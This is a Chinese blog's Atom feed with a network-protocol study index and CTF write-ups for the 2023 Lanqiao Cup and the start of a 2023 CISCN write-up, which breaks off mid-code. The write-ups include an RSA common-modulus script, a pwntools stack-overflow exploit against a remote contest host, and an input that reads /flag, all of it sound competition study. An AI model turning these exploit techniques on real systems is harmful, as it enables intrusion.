<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>十二惊惶</title>
  
  <subtitle>犁牛之子骍且角，虽欲勿用，山川其舍诸</subtitle>
  <link href="https://shierjinghuang.github.io/atom.xml" rel="self"/>
  
  <link href="https://shierjinghuang.github.io/"/>
  <updated>2024-01-06T04:00:29.841Z</updated>
  <id>https://shierjinghuang.github.io/</id>
  
  <author>
    <name>十二惊惶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络工程相关整理汇总</title>
    <link href="https://shierjinghuang.github.io/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/</id>
    <published>2024-01-01T04:24:35.000Z</published>
    <updated>2024-01-06T04:00:29.841Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h3><blockquote><p>负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，它定义了硬件设备之间的接口和传输媒体的特性，如电压、电流和光信号等 </p></blockquote><p>物理层规程</p><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><h4 id="常规特性："><a href="#常规特性：" class="headerlink" title="常规特性："></a>常规特性：</h4><ul><li><h5 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a><a href="https://shierjinghuang.github.io/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/">生成树协议</a></h5></li></ul><h4 id="高级特性："><a href="#高级特性：" class="headerlink" title="高级特性："></a>高级特性：</h4><ul><li><h5 id="生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP" class="headerlink" title="[生成树的改进 RSTP与MSTP](https://shierjinghuang.github.io/2023/03/06/生成树的改进 RSTP与MSTP/)"></a>[生成树的改进 RSTP与MSTP](<a href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B">https://shierjinghuang.github.io/2023/03/06/生成树的改进</a> RSTP与MSTP/)</h5></li></ul><h3 id="网际层："><a href="#网际层：" class="headerlink" title="网际层："></a>网际层：</h3><blockquote><p>网际层主要负责在不同的网络之间进行数据包的路由和转发，以确保数据能够从源主机传递到目标主机。该层定义了数据包的传输路径，决定了最佳的路径选择，以实现端到端的通信 </p></blockquote><h4 id="常规特性：-1"><a href="#常规特性：-1" class="headerlink" title="常规特性："></a>常规特性：</h4><blockquote><p>网际层常规特性包含日常学习中的关于网络协议的各种内容</p></blockquote><ul><li><h5 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/">网际协议IP</a></h5></li><li><h5 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li><li><h5 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/">地址解析协议 ARP</a></h5></li><li><h5 id="链路状态路由协议IS-IS"><a href="#链路状态路由协议IS-IS" class="headerlink" title="链路状态路由协议IS-IS"></a><a href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/">链路状态路由协议IS-IS</a></h5></li><li><h5 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a><a href="https://shierjinghuang.github.io/2022/11/16/IGMP/">Internet组管理协议IGMP</a></h5></li><li><h5 id="动态主机配置协议DHCP-1"><a href="#动态主机配置协议DHCP-1" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li></ul><h4 id="高级特性：-1"><a href="#高级特性：-1" class="headerlink" title="高级特性："></a>高级特性：</h4><blockquote><p>IPv6协议栈： IPv6协议栈是指一套软件和硬件组件，用于实现和支持IPv6协议的网络通信。它包括各种层次的协议、服务和功能，以确保设备能够正确地使用IPv6进行通信 </p></blockquote><ul><li><p><strong><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议结构</a></strong></p></li><li><h5 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a><a href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/">IPv6过渡技术</a></h5></li></ul><ul><li><h5 id="IGP高级特性"><a href="#IGP高级特性" class="headerlink" title="IGP高级特性"></a><a href="https://shierjinghuang.github.io/2024/01/01/IGP%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/">IGP高级特性</a></h5><blockquote><p>IGP高级特性包括多种快速收敛和保护机制，用于降低网络故障导致的流量丢失，以及路由选路及路由信息的控制，能够减少特定路由器路由表的大小</p></blockquote></li><li></li></ul><h3 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h3><ul><li><h5 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a><a href="https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/">传输层协议TCP与UDP</a></h5></li></ul><h3 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h3><ul><li><h5 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议:"></a><a href="https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/">RIP协议</a>:</h5><blockquote><p>rip是被当作一个应用层进程来实现的，所以它能在一个标准套接字上发送和接收报文，并且使用一个标准的运输层协议。RIP是一个运行在UDP上的应用层协议</p></blockquote></li><li><h5 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a><a href="https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/">超文本传输协议HTTP</a></h5></li><li><h5 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a><a href="https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/">文件传输协议FTP</a></h5></li></ul><h3 id="汇总："><a href="#汇总：" class="headerlink" title="汇总："></a>汇总：</h3><ul><li><p><a href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/">IPV4网络协议分析汇总</a></p></li><li><p><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议部分</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;物理层：&quot;&gt;&lt;a href=&quot;#物理层：&quot; class=&quot;headerlink&quot; title=&quot;物理层：&quot;&gt;&lt;/a&gt;物理层：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>2023年蓝桥杯网络安全大赛</title>
    <link href="https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-06-09T03:21:52.000Z</published>
    <updated>2025-03-27T08:03:17.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p><h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote><p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p></blockquote><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p><img src=".\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" /><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p><img src=".\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" /><p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p><img src=".\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" /><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png"></p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *import gmpy2import randomrandom.seed(123456)e1 &#x3D; random.randint(100000000, 999999999)e2 &#x3D; 65537n &#x3D;7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957m1 &#x3D;3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363m2 &#x3D;1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)if s &lt; 0:s &#x3D; -sm1 &#x3D; gmpy2.invert(m1, n)if t &lt; 0:t &#x3D; -tm2 &#x3D; gmpy2.invert(m2, n)m1 &#x3D; gmpy2.powmod(m1, s, n)m2 &#x3D; gmpy2.powmod(m2, t, n)m &#x3D; m1 * m2 % nflag &#x3D; long_to_bytes(m)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png"></p><h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./pwn')</span><span class="token comment"># libc = ELF('../../glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.200.77.68'</span><span class="token punctuation">,</span> <span class="token string">'12451'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./libc-2.27.so')</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> num <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011B1</span>payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote><p>以下为个人观点</p></blockquote><p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p><p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p><p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p><p>只能说不好评价也不想评价，蓝桥杯赛事主办方你开心就好</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;a href=&quot;#2023年蓝桥杯网络安全大赛&quot; class=&quot;headerlink&quot; title=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;/a&gt;2023年蓝桥杯网络安全大赛&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;WP部分</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="蓝桥杯" scheme="https://shierjinghuang.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023年ciscn题解</title>
    <link href="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
    <id>https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-27T11:56:52.000Z</published>
    <updated>2023-05-30T06:43:57.505Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token 